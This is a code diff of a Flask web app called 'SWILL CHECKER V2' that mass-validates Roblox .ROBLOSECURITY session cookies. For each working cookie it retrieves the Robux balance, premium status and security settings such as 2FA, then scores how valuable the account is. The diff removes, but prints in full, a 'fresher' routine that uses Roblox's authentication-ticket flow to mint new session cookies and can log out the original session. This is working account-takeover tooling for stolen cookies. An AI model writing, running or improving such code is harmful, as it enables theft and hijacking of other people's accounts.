@@ -1,24 +1,20 @@
 import os
-import asyncio
-import aiohttp
-import aiosqlite
 import json
 import re
 import time
 import logging
 import zipfile
+import sqlite3
+import requests
 from datetime import datetime
 from flask import Flask, render_template_string, request, jsonify, send_from_directory
 from io import BytesIO
-from cryptography.fernet import Fernet
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 os.makedirs("downloads", exist_ok=True)
 os.makedirs("uploads", exist_ok=True)
 os.makedirs("logs", exist_ok=True)
 os.makedirs("history", exist_ok=True)
-
-ENCRYPTION_KEY = Fernet.generate_key()
-cipher = Fernet(ENCRYPTION_KEY)
 
 logging.basicConfig(
     level=logging.INFO,
@@ -32,55 +28,37 @@ logger = logging.getLogger(__name__)
 
 DB_PATH = "history/swill.db"
 
-async def init_db():
-    async with aiosqlite.connect(DB_PATH) as db:
-        await db.execute("""
-            CREATE TABLE IF NOT EXISTS checker_history (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                timestamp TEXT,
-                type TEXT,
-                total INTEGER,
-                valid INTEGER,
-                cookies TEXT,
-                full_data TEXT,
-                download_url TEXT
-            )
-        """)
-        await db.execute("""
-            CREATE TABLE IF NOT EXISTS fresher_history (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                timestamp TEXT,
-                mode TEXT,
-                refreshed_count INTEGER,
-                success_count INTEGER,
-                fail_count INTEGER,
-                cookies TEXT,
-                old_cookies TEXT
-            )
-        """)
-        await db.execute("""
-            CREATE TABLE IF NOT EXISTS accounts (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id TEXT UNIQUE,
-                username TEXT,
-                cookie_encrypted TEXT,
-                last_check TEXT,
-                robux INTEGER,
-                is_premium INTEGER,
-                created TEXT,
-                score INTEGER,
-                checked_count INTEGER
-            )
-        """)
-        await db.commit()
+def init_db():
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS checker_history (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            timestamp TEXT,
+            type TEXT,
+            total INTEGER,
+            valid INTEGER,
+            cookies TEXT,
+            full_data TEXT,
+            download_url TEXT
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS fresher_history (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            timestamp TEXT,
+            mode TEXT,
+            refreshed_count INTEGER,
+            success_count INTEGER,
+            fail_count INTEGER,
+            cookies TEXT,
+            old_cookies TEXT
+        )
+    """)
+    conn.commit()
+    conn.close()
 
-def encrypt_cookie(cookie: str) -> str:
-    return cipher.encrypt(cookie.encode()).decode()
-
-def decrypt_cookie(encrypted: str) -> str:
-    return cipher.decrypt(encrypted.encode()).decode()
-
-def extract_cookies_from_text(text: str):
+def extract_cookies_from_text(text):
     cookies = []
     pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
     for match in re.findall(pattern, text):
@@ -104,6 +82,130 @@ def extract_cookies_from_text(text: str):
             unique.append(c)
     return unique
 
+def quick_validate(cookie):
+    result = {
+        'status': '❌',
+        'username': '?',
+        'user_id': '?',
+        'robux': 0,
+        'created': '?',
+        'created_ts': 0,
+        'is_premium': False,
+        'has_email': False,
+        'has_2fa': False,
+        'has_pin': False,
+        'has_phone': False,
+        'cookie': cookie,
+        'score': 0,
+        'is_banned': False,
+        'security_status': '⚠️ НИЗКИЙ'
+    }
+    
+    try:
+        c = cookie.strip()
+        if ".ROBLOSECURITY=" in c:
+            c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
+        
+        headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
+        cookies = {'.ROBLOSECURITY': c}
+        
+        s = requests.Session()
+        r = s.get('https://users.roblox.com/v1/users/authenticated', headers=headers, cookies=cookies, timeout=15, verify=False)
+        if r.status_code != 200:
+            return result
+        data = r.json()
+        if 'id' not in data:
+            return result
+        
+        result['status'] = '✅'
+        result['username'] = data.get('name', '?')
+        result['user_id'] = data.get('id', '?')
+        uid = result['user_id']
+        
+        # Robux
+        try:
+            rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', headers=headers, cookies=cookies, timeout=10, verify=False)
+            if rb.status_code == 200:
+                result['robux'] = rb.json().get('robux', 0)
+        except: pass
+        
+        # Created
+        try:
+            rd = s.get(f'https://users.roblox.com/v1/users/{uid}', headers=headers, cookies=cookies, timeout=10, verify=False)
+            if rd.status_code == 200:
+                created = rd.json().get('created', '')
+                if created:
+                    dt = datetime.fromisoformat(created.replace('Z', '+00:00'))
+                    result['created'] = dt.strftime('%d.%m.%Y')
+                    result['created_ts'] = dt.timestamp()
+        except: pass
+        
+        # Premium
+        try:
+            pm = s.get(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', headers=headers, cookies=cookies, timeout=10, verify=False)
+            if pm.status_code == 200:
+                result['is_premium'] = pm.json().get('isSubscribed', False)
+        except: pass
+        
+        # Security
+        try:
+            st = s.get('https://www.roblox.com/my/settings/json', headers=headers, cookies=cookies, timeout=10, verify=False)
+            if st.status_code == 200:
+                sec = st.json().get('MyAccountSecurityModel', {})
+                result['has_email'] = sec.get('IsEmailSet', False)
+                result['has_2fa'] = sec.get('IsTwoStepEnabled', False)
+                result['has_pin'] = sec.get('IsAccountPinEnabled', False)
+                result['has_phone'] = sec.get('IsPhoneSet', False)
+        except: pass
+        
+        # Score
+        score = 0
+        if result['robux'] >= 10000: score += 100
+        elif result['robux'] >= 1000: score += 50
+        elif result['robux'] >= 100: score += 25
+        elif result['robux'] > 0: score += 10
+        
+        if result['is_premium']: score += 50
+        if result['has_email']: score += 15
+        if result['has_2fa']: score += 10
+        if result['has_pin']: score += 5
+        if result['has_phone']: score += 5
+        
+        if result['created_ts'] > 0:
+            age = (datetime.now().timestamp() - result['created_ts']) / 86400
+            if age > 365*3: score += 30
+            elif age > 365: score += 20
+            elif age > 180: score += 10
+        
+        result['score'] = min(score, 300)
+        
+        sec_count = sum([result['has_email'], result['has_2fa'], result['has_pin'], result['has_phone']])
+        if sec_count >= 3:
+            result['security_status'] = '🔒 ВЫСОКИЙ'
+        elif sec_count >= 2:
+            result['security_status'] = '🔐 СРЕДНИЙ'
+        else:
+            result['security_status'] = '⚠️ НИЗКИЙ'
+            
+    except Exception as e:
+        logger.error(f"Error: {e}")
+        result['status'] = '❌'
+    
+    return result
+
+def mass_check(cookies_list):
+    if not cookies_list:
+        return []
+    results = []
+    with ThreadPoolExecutor(max_workers=20) as ex:
+        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
+        for f in as_completed(futures):
+            try:
+                results.append(f.result())
+            except:
+                results.append({'status': '❌', 'cookie': futures[f], 'score': -1})
+    return results
+
 def format_quick_report(result):
     if result['status'] != '✅':
         return "❌ НЕВАЛИД"
@@ -121,7 +223,6 @@ def format_quick_report(result):
     if result.get('has_2fa'): badges.append("🔐")
     if result.get('has_pin'): badges.append("📌")
     if result.get('has_email'): badges.append("📧")
-    if result.get('is_banned'): badges.append("🚫")
     
     return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} | {result['created']} | S:{score} {' '.join(badges)}"
 
@@ -176,292 +277,6 @@ def clean_cookies(content):
             cookies.append(l)
     return '\n'.join(cookies)
 
-def run_async(coro):
-    try:
-        loop = asyncio.get_running_loop()
-    except RuntimeError:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    return loop.run_until_complete(coro)
-
-class AsyncRobloxChecker:
-    def __init__(self, max_workers: int = 20):
-        self.max_workers = max_workers
-        self.session = None
-        
-    async def __aenter__(self):
-        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20)
-        timeout = aiohttp.ClientTimeout(total=30, connect=10)
-        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
-        return self
-    
-    async def __aexit__(self, exc_type, exc_val, exc_tb):
-        if self.session:
-            await self.session.close()
-    
-    async def quick_validate(self, cookie: str):
-        result = {
-            'status': '❌',
-            'username': '?',
-            'user_id': '?',
-            'robux': 0,
-            'created': '?',
-            'created_ts': 0,
-            'is_premium': False,
-            'has_email': False,
-            'has_2fa': False,
-            'has_pin': False,
-            'has_phone': False,
-            'cookie': cookie,
-            'score': 0,
-            'is_banned': False,
-            'security_status': '⚠️ НИЗКИЙ',
-            'friends_count': 0,
-            'followers_count': 0
-        }
-        
-        try:
-            c = cookie.strip()
-            if ".ROBLOSECURITY=" in c:
-                c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
-            
-            headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
-            cookies = {'.ROBLOSECURITY': c}
-            
-            async with self.session.get('https://users.roblox.com/v1/users/authenticated', headers=headers, cookies=cookies) as resp:
-                if resp.status != 200:
-                    return result
-                data = await resp.json()
-                if 'id' not in data:
-                    return result
-                
-                result['status'] = '✅'
-                result['username'] = data.get('name', '?')
-                result['user_id'] = data.get('id', '?')
-                uid = result['user_id']
-            
-            tasks = []
-            tasks.append(self._fetch_json(f'https://economy.roblox.com/v1/users/{uid}/currency', headers, cookies))
-            tasks.append(self._fetch_json(f'https://users.roblox.com/v1/users/{uid}', headers, cookies))
-            tasks.append(self._fetch_json(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', headers, cookies))
-            tasks.append(self._fetch_json('https://www.roblox.com/my/settings/json', headers, cookies))
-            tasks.append(self._fetch_json(f'https://friends.roblox.com/v1/users/{uid}/friends/count', headers, cookies))
-            tasks.append(self._fetch_json(f'https://friends.roblox.com/v1/users/{uid}/followers/count', headers, cookies))
-            
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            
-            if isinstance(results[0], dict):
-                result['robux'] = results[0].get('robux', 0)
-            if isinstance(results[1], dict):
-                created = results[1].get('created', '')
-                if created:
-                    try:
-                        dt = datetime.fromisoformat(created.replace('Z', '+00:00'))
-                        result['created'] = dt.strftime('%d.%m.%Y')
-                        result['created_ts'] = dt.timestamp()
-                    except:
-                        pass
-            if isinstance(results[2], dict):
-                result['is_premium'] = results[2].get('isSubscribed', False)
-            if isinstance(results[3], dict):
-                sec = results[3].get('MyAccountSecurityModel', {})
-                result['has_email'] = sec.get('IsEmailSet', False)
-                result['has_2fa'] = sec.get('IsTwoStepEnabled', False)
-                result['has_pin'] = sec.get('IsAccountPinEnabled', False)
-                result['has_phone'] = sec.get('IsPhoneSet', False)
-            if isinstance(results[4], dict):
-                result['friends_count'] = results[4].get('count', 0)
-            if isinstance(results[5], dict):
-                result['followers_count'] = results[5].get('count', 0)
-            
-            score = 0
-            if result['robux'] >= 10000: score += 100
-            elif result['robux'] >= 1000: score += 50
-            elif result['robux'] >= 100: score += 25
-            elif result['robux'] > 0: score += 10
-            
-            if result['is_premium']: score += 50
-            if result['has_email']: score += 15
-            if result['has_2fa']: score += 10
-            if result['has_pin']: score += 5
-            if result['has_phone']: score += 5
-            
-            if result['created_ts'] > 0:
-                age = (datetime.now().timestamp() - result['created_ts']) / 86400
-                if age > 365*3: score += 30
-                elif age > 365: score += 20
-                elif age > 180: score += 10
-            
-            if result['friends_count'] > 100: score += 10
-            if result['followers_count'] > 100: score += 10
-            
-            result['score'] = min(score, 300)
-            
-            sec_count = sum([result['has_email'], result['has_2fa'], result['has_pin'], result['has_phone']])
-            if sec_count >= 3:
-                result['security_status'] = '🔒 ВЫСОКИЙ'
-            elif sec_count >= 2:
-                result['security_status'] = '🔐 СРЕДНИЙ'
-            else:
-                result['security_status'] = '⚠️ НИЗКИЙ'
-                
-        except Exception as e:
-            logger.error(f"Error validating cookie: {e}")
-            result['status'] = '❌'
-        
-        return result
-    
-    async def _fetch_json(self, url: str, headers: dict, cookies: dict):
-        try:
-            async with self.session.get(url, headers=headers, cookies=cookies) as resp:
-                if resp.status == 200:
-                    return await resp.json()
-                return {}
-        except:
-            return {}
-    
-    async def mass_check(self, cookies: list):
-        semaphore = asyncio.Semaphore(self.max_workers)
-        
-        async def check_with_semaphore(cookie):
-            async with semaphore:
-                return await self.quick_validate(cookie)
-        
-        tasks = [check_with_semaphore(c) for c in cookies]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        final_results = []
-        for i, result in enumerate(results):
-            if isinstance(result, Exception):
-                final_results.append({
-                    'status': '❌',
-                    'cookie': cookies[i],
-                    'error': str(result)[:100],
-                    'score': -1
-                })
-            else:
-                final_results.append(result)
-        
-        return final_results
-
-class AsyncRobloxFresher:
-    def __init__(self, max_workers: int = 5):
-        self.max_workers = max_workers
-        
-    async def refresh_cookie(self, cookie: str, kill_old: bool = False):
-        result = {
-            'success': False,
-            'new_cookie': None,
-            'username': '?',
-            'user_id': '?',
-            'error': None
-        }
-        
-        try:
-            c = cookie.strip()
-            if ".ROBLOSECURITY=" in c:
-                c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
-            
-            cookies_dict = {'.ROBLOSECURITY': c}
-            headers = {'User-Agent': 'Mozilla/5.0'}
-            
-            async with aiohttp.ClientSession() as session:
-                async with session.get('https://users.roblox.com/v1/users/authenticated', headers=headers, cookies=cookies_dict) as resp:
-                    if resp.status != 200:
-                        result['error'] = "Кука невалидна"
-                        return result
-                    user_data = await resp.json()
-                    result['username'] = user_data.get('name', '?')
-                    result['user_id'] = user_data.get('id', '?')
-                
-                async with session.post('https://auth.roblox.com/v2/logout', headers=headers, cookies=cookies_dict) as resp:
-                    csrf_token = resp.headers.get('x-csrf-token')
-                    if not csrf_token:
-                        result['error'] = "CSRF token not found"
-                        return result
-                
-                ticket_headers = {
-                    'User-Agent': 'Mozilla/5.0',
-                    'RBXauthenticationNegotiation': '1',
-                    'referer': 'https://www.roblox.com/hewhewhew',
-                    'X-CSRF-Token': csrf_token,
-                    'Content-Type': 'application/json'
-                }
-                async with session.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}) as resp:
-                    auth_ticket = resp.headers.get('rbx-authentication-ticket')
-                    if not auth_ticket:
-                        result['error'] = "Auth ticket not found"
-                        return result
-                
-                redeem_headers = {
-                    'User-Agent': 'Mozilla/5.0',
-                    'RBXauthenticationNegotiation': '1',
-                    'Content-Type': 'application/json'
-                }
-                async with session.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}) as resp:
-                    new_cookie_value = None
-                    set_cookie = resp.headers.get('Set-Cookie', '')
-                    if '.ROBLOSECURITY=' in set_cookie:
-                        match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
-                        if match:
-                            new_cookie_value = match.group(1)
-                    
-                    if not new_cookie_value:
-                        for co in resp.cookies:
-                            if co.key == '.ROBLOSECURITY' and co.value:
-                                new_cookie_value = co.value
-                                break
-                
-                if not new_cookie_value:
-                    result['error'] = "New cookie not found"
-                    return result
-                
-                if kill_old:
-                    try:
-                        break_headers = {
-                            'User-Agent': 'Mozilla/5.0',
-                            'X-CSRF-Token': csrf_token,
-                            'Content-Type': 'application/json'
-                        }
-                        await session.post('https://auth.roblox.com/v2/logout', headers=break_headers, cookies=cookies_dict)
-                    except:
-                        pass
-                
-                async with session.get('https://users.roblox.com/v1/users/authenticated', headers=headers, cookies={'.ROBLOSECURITY': new_cookie_value}) as resp:
-                    if resp.status == 200 and 'id' in await resp.json():
-                        result['new_cookie'] = new_cookie_value
-                        result['success'] = True
-                    else:
-                        result['error'] = "New cookie validation failed"
-                        
-        except Exception as e:
-            result['error'] = str(e)
-        
-        return result
-    
-    async def mass_refresh(self, cookies: list, kill_old: bool = False):
-        semaphore = asyncio.Semaphore(self.max_workers)
-        
-        async def refresh_with_semaphore(cookie):
-            async with semaphore:
-                return await self.refresh_cookie(cookie, kill_old)
-        
-        tasks = [refresh_with_semaphore(c) for c in cookies]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        final_results = []
-        for i, result in enumerate(results):
-            if isinstance(result, Exception):
-                final_results.append({
-                    'success': False,
-                    'error': str(result)[:100],
-                    'cookie': cookies[i]
-                })
-            else:
-                final_results.append(result)
-        
-        return final_results
-
 app = Flask(__name__)
 
 HTML = """<!DOCTYPE html>
@@ -472,7 +287,7 @@ HTML = """<!DOCTYPE html>
 <title>SWILL CHECKER V2</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
 <style>
-:root{--bg:#0a0a1a;--bg2:#12122a;--card:#1a1a3a;--card2:#22224a;--input:#0d0d22;--border:#2a2a5a;--text:#fff;--text2:#8888bb;--accent:#7c3aed;--green:#10b981;--red:#ef4444}
+:root{--bg:#0a0a1a;--bg2:#12122a;--card:#1a1a3a;--card2:#22224a;--input:#0d0d22;--border:#2a2a5a;--text:#fff;--text2:#8888bb;--accent:#7c3aed}
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Inter',sans-serif;min-height:100vh;background:var(--bg)}
 .wrapper{max-width:1600px;margin:0 auto;padding:20px}
@@ -483,7 +298,7 @@ body{font-family:'Inter',sans-serif;min-height:100vh;background:var(--bg)}
 .stat-card .label{font-size:10px;color:var(--text2);text-transform:uppercase}
 .stat-card .value{font-size:20px;font-weight:700;color:var(--text)}
 .tabs{display:flex;gap:8px;margin-bottom:24px;flex-wrap:wrap}
-.tab{padding:10px 24px;background:var(--card);border:1px solid var(--border);border-radius:30px;color:var(--text2);cursor:pointer;font-weight:600;transition:all 0.3s}
+.tab{padding:10px 24px;background:var(--card);border:1px solid var(--border);border-radius:30px;color:var(--text2);cursor:pointer;font-weight:600}
 .tab:hover{border-color:var(--accent);color:var(--text)}
 .tab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
 .tab-content{display:none}
@@ -493,9 +308,9 @@ body{font-family:'Inter',sans-serif;min-height:100vh;background:var(--bg)}
 .card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px 24px;margin-bottom:20px}
 .card h2{font-size:18px;margin-bottom:14px;color:var(--text)}
 .textarea{width:100%;padding:12px;background:var(--input);border:1px solid var(--border);border-radius:10px;color:var(--text);font-family:monospace;font-size:13px;resize:vertical;min-height:100px}
-.upload-area{width:100%;padding:30px;background:var(--input);border:2px dashed var(--border);border-radius:12px;text-align:center;cursor:pointer;transition:all 0.3s}
+.upload-area{width:100%;padding:30px;background:var(--input);border:2px dashed var(--border);border-radius:12px;text-align:center;cursor:pointer}
 .upload-area:hover{border-color:var(--accent);background:rgba(124,58,237,0.05)}
-.btn{padding:10px 24px;border:none;border-radius:30px;font-weight:700;color:#fff;cursor:pointer;transition:all 0.3s;font-size:13px}
+.btn{padding:10px 24px;border:none;border-radius:30px;font-weight:700;color:#fff;cursor:pointer;font-size:13px}
 .btn-primary{background:linear-gradient(135deg,#7c3aed,#a855f7)}
 .btn-success{background:linear-gradient(135deg,#059669,#10b981)}
 .btn-danger{background:linear-gradient(135deg,#dc2626,#ef4444)}
@@ -516,20 +331,18 @@ body{font-family:'Inter',sans-serif;min-height:100vh;background:var(--bg)}
 .mt-12{margin-top:12px}
 .text-muted{color:var(--text2);font-size:12px}
 .filter-bar{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
-.filter-chip{padding:4px 12px;border-radius:14px;font-size:11px;cursor:pointer;background:var(--input);border:1px solid var(--border);color:var(--text2);transition:all 0.2s}
+.filter-chip{padding:4px 12px;border-radius:14px;font-size:11px;cursor:pointer;background:var(--input);border:1px solid var(--border);color:var(--text2)}
 .filter-chip.active{background:rgba(124,58,237,0.3);border-color:var(--accent);color:var(--accent)}
 .footer{text-align:center;padding:20px 0;color:var(--text2);font-size:12px;border-top:1px solid var(--border);margin-top:24px}
 </style>
 </head>
 <body>
 <div class="wrapper">
-<div class="header">
-<div class="logo">⚡ SWILL CHECKER V2</div>
+<div class="header"><div class="logo">⚡ SWILL CHECKER V2</div>
 <div style="display:flex;gap:12px;align-items:center">
 <span id="sessionTimer" style="color:#10b981;font-family:monospace;font-size:14px;">⏱️ 00:00:00</span>
 <button class="btn btn-secondary btn-sm" onclick="document.documentElement.setAttribute('data-theme',document.documentElement.getAttribute('data-theme')==='dark'?'light':'dark')">🌓</button>
-</div>
-</div>
+</div></div>
 
 <div class="stats-row">
 <div class="stat-card"><div class="label">Всего</div><div class="value" id="totalChecked">0</div></div>
@@ -551,19 +364,19 @@ body{font-family:'Inter',sans-serif;min-height:100vh;background:var(--bg)}
 <div class="card">
 <h2>🔍 Одиночная</h2>
 <textarea class="textarea" id="singleCookie" placeholder="Вставьте один кук..." rows="3"></textarea>
-<button class="btn btn-primary mt-8" id="btnSingleCheck" style="width:100%">🔍 Проверить</button>
+<button class="btn btn-primary mt-8" onclick="runSingleCheck()" style="width:100%">🔍 Проверить</button>
 <div class="result-box" id="singleResult">Ожидание...</div>
 </div>
 <div class="card">
 <h2>📦 Массовая</h2>
-<div class="upload-area" id="massDropArea">
+<div class="upload-area" onclick="document.getElementById('massFile').click()">
 <p>📁 Перетащите или выберите TXT</p>
-<p class="text-muted">Асинхронно, 20 потоков</p>
+<p class="text-muted">20 потоков</p>
 </div>
 <input type="file" id="massFile" accept=".txt" style="display:none">
 <div id="massFileInfo" class="text-muted" style="margin-top:6px"></div>
 <div id="extractInfo" class="text-muted" style="display:none;color:#10b981"></div>
-<button class="btn btn-success mt-8" id="btnMassCheck" style="width:100%">🚀 Запустить</button>
+<button class="btn btn-success mt-8" onclick="runMassCheck()" style="width:100%">🚀 Запустить</button>
 <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
 <div id="massLog" style="max-height:60px;overflow-y:auto;margin-top:6px;font-size:11px;color:var(--text2)"></div>
 <div class="filter-bar mt-8" id="filterBar" style="display:none">
@@ -596,9 +409,9 @@ body{font-family:'Inter',sans-serif;min-height:100vh;background:var(--bg)}
 <input type="hidden" id="fresherMode" value="duplicate">
 <div class="flex-row">
 <div class="flex-1"><textarea class="textarea" id="fresherCookies" placeholder="Вставьте куки..." rows="6"></textarea></div>
-<div class="flex-1"><div class="upload-area" id="fresherDropArea"><p>📁 Или загрузите .txt</p></div><input type="file" id="fresherFile" accept=".txt" style="display:none"></div>
+<div class="flex-1"><div class="upload-area" onclick="document.getElementById('fresherFile').click()"><p>📁 Или загрузите .txt</p></div><input type="file" id="fresherFile" accept=".txt" style="display:none"></div>
 </div>
-<button class="btn btn-success mt-8" id="btnFresher" style="width:100%">⚡ Обновить</button>
+<button class="btn btn-success mt-8" onclick="runFresher()" style="width:100%">⚡ Обновить</button>
 <div class="progress-bar"><div class="progress-fill" id="fresherProgress"></div></div>
 <div id="fresherStats" class="text-muted mt-8"></div>
 <div class="result-box" id="fresherResult">Новые куки здесь...</div>
@@ -616,14 +429,14 @@ body{font-family:'Inter',sans-serif;min-height:100vh;background:var(--bg)}
 
 <div class="tab-content" id="tab-tools">
 <div class="grid-2">
-<div class="card"><h3>🔗 Слияние</h3><div class="upload-area" id="mergeDropArea"><p>📁 Выберите файлы</p></div><input type="file" id="mergeFiles" accept=".txt" multiple style="display:none"><button class="btn btn-primary mt-8" id="btnMerge">🔄 Объединить</button><div class="result-box" id="mergeResult">Ожидание...</div></div>
-<div class="card"><h3>✂️ Разделение</h3><div class="upload-area" id="splitDropArea"><p>📁 Выберите файл</p></div><input type="file" id="splitFile" accept=".txt" style="display:none"><div class="flex-row mt-8"><input type="number" id="splitCount" value="100" style="flex:1;padding:8px;background:var(--input);border:1px solid var(--border);border-radius:8px;color:var(--text)"><button class="btn btn-primary btn-sm" id="btnSplitCount">По N</button><button class="btn btn-primary btn-sm" id="btnSplitFiles">На N файлов</button></div><div class="result-box" id="splitResult">Ожидание...</div></div>
-<div class="card"><h3>🧹 Очистка</h3><textarea class="textarea" id="cleanInput" placeholder="Вставьте куки..." rows="3"></textarea><div class="gap-8 mt-8"><button class="btn btn-primary btn-sm" id="btnCleanDedup">🔄 Дубликаты</button><button class="btn btn-secondary btn-sm" id="btnCleanFormat">📝 Формат</button></div><div class="result-box" id="cleanResult">Ожидание...</div></div>
-<div class="card"><h3>📊 Статистика</h3><button class="btn btn-primary" id="btnStats" style="width:100%">📊 Обновить</button><div class="result-box" id="statsResult">Ожидание...</div></div>
+<div class="card"><h3>🔗 Слияние</h3><div class="upload-area" onclick="document.getElementById('mergeFiles').click()"><p>📁 Выберите файлы</p></div><input type="file" id="mergeFiles" accept=".txt" multiple style="display:none"><button class="btn btn-primary mt-8" onclick="mergeCookies()">🔄 Объединить</button><div class="result-box" id="mergeResult">Ожидание...</div></div>
+<div class="card"><h3>✂️ Разделение</h3><div class="upload-area" onclick="document.getElementById('splitFile').click()"><p>📁 Выберите файл</p></div><input type="file" id="splitFile" accept=".txt" style="display:none"><div class="flex-row mt-8"><input type="number" id="splitCount" value="100" style="flex:1;padding:8px;background:var(--input);border:1px solid var(--border);border-radius:8px;color:var(--text)"><button class="btn btn-primary btn-sm" onclick="splitByCount()">По N</button><button class="btn btn-primary btn-sm" onclick="splitByFiles()">На N файлов</button></div><div class="result-box" id="splitResult">Ожидание...</div></div>
+<div class="card"><h3>🧹 Очистка</h3><textarea class="textarea" id="cleanInput" placeholder="Вставьте куки..." rows="3"></textarea><div class="gap-8 mt-8"><button class="btn btn-primary btn-sm" onclick="cleanCookies('deduplicate')">🔄 Дубликаты</button><button class="btn btn-secondary btn-sm" onclick="cleanCookies('format')">📝 Формат</button></div><div class="result-box" id="cleanResult">Ожидание...</div></div>
+<div class="card"><h3>📊 Статистика</h3><button class="btn btn-primary" onclick="loadStats()" style="width:100%">📊 Обновить</button><div class="result-box" id="statsResult">Ожидание...</div></div>
 </div>
 </div>
 
-<div class="footer">SWILL CHECKER V2 · Асинхронный движок · SQLite</div>
+<div class="footer">SWILL CHECKER V2 · 20 потоков · SQLite</div>
 </div>
 
 <script>
@@ -645,29 +458,6 @@ function setFresherMode(mode){
     document.getElementById('modeDuplicate').className='btn btn-sm '+(mode==='duplicate'?'btn-primary':'btn-secondary');
     document.getElementById('modeKill').className='btn btn-sm '+(mode==='kill'?'btn-danger':'btn-secondary');
 }
-
-// ==== Drag & Drop ====
-function setupDrop(areaId, inputId, callback){
-    const area=document.getElementById(areaId);
-    if(!area)return;
-    area.addEventListener('dragover',e=>{e.preventDefault();area.style.borderColor='#7c3aed'});
-    area.addEventListener('dragleave',e=>{e.preventDefault();area.style.borderColor=''});
-    area.addEventListener('drop',e=>{
-        e.preventDefault();area.style.borderColor='';
-        if(e.dataTransfer.files.length){
-            const input=document.getElementById(inputId);
-            input.files=e.dataTransfer.files;
-            input.dispatchEvent(new Event('change'));
-            if(callback)callback();
-        }
-    });
-    area.addEventListener('click',()=>document.getElementById(inputId).click());
-}
-
-setupDrop('massDropArea','massFile');
-setupDrop('fresherDropArea','fresherFile');
-setupDrop('mergeDropArea','mergeFiles');
-setupDrop('splitDropArea','splitFile');
 
 document.getElementById('massFile').addEventListener('change',function(){
     if(this.files&&this.files[0]){
@@ -692,21 +482,6 @@ document.getElementById('fresherFile').addEventListener('change',function(){
     }
 });
 
-// ==== Кнопки через addEventListener ====
-document.addEventListener('DOMContentLoaded',function(){
-    document.getElementById('btnSingleCheck').addEventListener('click',runSingleCheck);
-    document.getElementById('btnMassCheck').addEventListener('click',runMassCheck);
-    document.getElementById('btnFresher').addEventListener('click',runFresher);
-    document.getElementById('btnMerge').addEventListener('click',mergeCookies);
-    document.getElementById('btnSplitCount').addEventListener('click',splitByCount);
-    document.getElementById('btnSplitFiles').addEventListener('click',splitByFiles);
-    document.getElementById('btnCleanDedup').addEventListener('click',function(){cleanCookies('deduplicate')});
-    document.getElementById('btnCleanFormat').addEventListener('click',function(){cleanCookies('format')});
-    document.getElementById('btnStats').addEventListener('click',loadStats);
-    loadStats();loadHistory();
-});
-
-// ==== Функции ====
 async function runSingleCheck(){
     let c=document.getElementById('singleCookie').value.trim();
     if(!c){document.getElementById('singleResult').textContent='❌ Вставьте кук!';return}
@@ -722,7 +497,7 @@ async function runSingleCheck(){
 async function runMassCheck(){
     if(!window.massFileContent){document.getElementById('massResult').textContent='❌ Загрузите TXT файл!';return}
     let logBox=document.getElementById('massLog');let resBox=document.getElementById('massResult');let progress=document.getElementById('massProgress');
-    resBox.textContent='⏳ Асинхронная проверка...';progress.style.width='10%';logBox.innerHTML='🔄 Запуск (20 потоков)...';
+    resBox.textContent='⏳ Проверка...';progress.style.width='10%';logBox.innerHTML='🔄 Запуск (20 потоков)...';
     try{
         let startCheck=Date.now();
         let r=await fetch('/api/mass-check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:window.massFileContent})});
@@ -881,6 +656,8 @@ async function loadStats(){
         }
     }catch(e){document.getElementById('statsResult').textContent='❌ '+e.message}
 }
+
+loadStats();loadHistory();
 </script>
 </body>
 </html>"""
@@ -903,17 +680,11 @@ def api_single_check():
     if not cookie:
         return jsonify({"success": False, "message": "Кук не предоставлен"})
     
-    async def check():
-        async with AsyncRobloxChecker(max_workers=1) as checker:
-            return await checker.quick_validate(cookie)
-    
-    result = run_async(check())
-    
+    result = quick_validate(cookie)
     report = format_quick_report(result)
     if result['status'] == '✅':
         report += f"\n🍪 {result['cookie']}"
     
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute(
@@ -941,11 +712,7 @@ def api_mass_check():
     
     logger.info(f"Starting mass check for {len(cookies)} cookies")
     
-    async def check_all():
-        async with AsyncRobloxChecker(max_workers=20) as checker:
-            return await checker.mass_check(cookies)
-    
-    results = run_async(check_all())
+    results = mass_check(cookies)
     
     valid = [r for r in results if r['status'] == '✅']
     invalid = [r for r in results if r['status'] == '❌' or r['status'] == '🚫']
@@ -970,7 +737,6 @@ def api_mass_check():
     
     download_url = f"/downloads/{filename}"
     
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
